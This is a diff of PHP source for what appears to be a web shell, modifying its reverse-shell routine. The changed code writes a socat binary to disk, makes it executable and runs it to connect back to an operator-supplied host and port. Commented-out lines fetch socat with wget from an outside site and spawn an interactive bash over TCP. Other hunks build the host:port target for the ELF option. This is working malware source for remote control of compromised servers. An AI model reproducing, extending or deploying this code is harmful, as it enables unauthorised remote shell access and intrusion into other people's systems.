@@ -185,12 +185,20 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
 	elseif($s_lang=="elf"){
 		$s_fpath = "rootkit_ninja_socat";
 		if(is_file($s_fpath)) unlink($s_fpath);
+		// $s_result = exe("wget -q https://www.rootkit-ninja.com/tmp/socat -O ".$s_fpath);
+		// if(is_file($s_fpath)){
+		// 	$s_result = exe("chmod +x ".$s_fpath);
+		// 	$s_result = exe("./".$s_fpath." exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:".$s_rstarget);
+		// }
 		if($s_file=fopen($s_fpath,"w")){
 			fwrite($s_file,$s_fc);
 			fclose($s_file);
 			if(is_file($s_fpath)){
-				$s_result = exe("chmod +x ".$s_fpath);
-				$s_result = exe("./".$s_fpath." exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:".$s_rstarget);
+				if(is_file($s_fpath)){
+					$s_result = exe("chmod +x ".$s_fpath);
+					$s_result = exe("./".$s_fpath." ".$s_rstarget);
+				}
+				else $s_result = $s_errperm;
 			}
 			else $s_result = $s_errperm;
 		}
@@ -2057,6 +2065,9 @@ if($s_auth){
 				elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
 				elseif($s_split[1]=="php") $s_rscode = $s_rs_php;
 				elseif($s_split[1]=="elf") $s_rscode = $s_rs_socat;
+
+				if($s_split[1]=="elf") $s_rstarget_packed = $s_rshost_.":".$s_rsport_;
+				
 				$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
 				if($s_buff!="") $s_rs_err = "<p class='notif'>".hss($s_buff)."</p>";
 			}
